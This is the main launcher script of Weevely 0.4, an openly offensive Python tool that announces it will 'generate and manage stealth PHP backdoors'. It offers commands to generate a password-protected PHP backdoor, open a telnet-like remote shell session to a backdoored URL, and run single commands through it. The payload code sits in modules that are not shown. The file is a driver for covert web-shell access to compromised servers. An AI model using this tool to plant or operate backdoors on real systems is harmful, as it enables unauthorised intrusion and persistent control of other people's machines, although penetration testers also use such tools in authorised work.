#!/usr/bin/env python
# This file is part of Weevely NG.
#
# Copyright(c) 2011-2012 Weevely Developers
# http://code.google.com/p/weevely/
#
# This file may be licensed under the terms of of the
# GNU General Public License Version 2 (the ``GPL'').
#
# Software distributed under the License is distributed
# on an ``AS IS'' basis, WITHOUT WARRANTY OF ANY KIND, either
# express or implied. See the GPL for the specific language
# governing rights and limitations.
#
# You should have received a copy of the GPL along with this
# program. If not, go to http://www.gnu.org/licenses/gpl.html
# or write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.


from core.terminal import Terminal
from core.backdoor import Backdoor
from core.modulesdict import ModDict

import sys
    
print '''
Weevely 0.4 - Generate and manage stealth PHP backdoors
              Emilio Pinna, Simone Margaritelli 2011-2012            
'''
    
if __name__ == "__main__":

    
    if  len(sys.argv) == 4 and sys.argv[1] == 'terminal':
        
        try:
            Terminal ( ModDict(), sys.argv[2], sys.argv[3]).loop()
        except KeyboardInterrupt:
            print '\n[!] Exiting. Bye ^^'
        
    elif len(sys.argv) == 4 and sys.argv[1] == 'generate':
        Backdoor( sys.argv[2] ).save( sys.argv[3] )
        
    elif len(sys.argv) > 4 and sys.argv[1] == 'cmd':

        url = sys.argv[2]
        password = sys.argv[3]        
        command = sys.argv[4:]
 
        Terminal (ModDict(), url, password, True).run_single(command)

    else:
        
        print '''
Start telnet-like session
  ./weevely.py terminal <url> <password> 

Execute single command
  ./weevely.py cmd <url> <password> "<command>" 

Generate php backdoor
  ./weevely.py generate <password> <output path> 

Use modules running ':module <module name> <argument1> <arg2> ..' as command.
Print modules documentation running ':help'. Available modules:'''  
        
        i = 0
        for mod in ModDict().module_info:
            if i == 6:
                i = 0
            else:
                i+=1
                
            print '[' +  mod + ']',
            
        print '' 
    
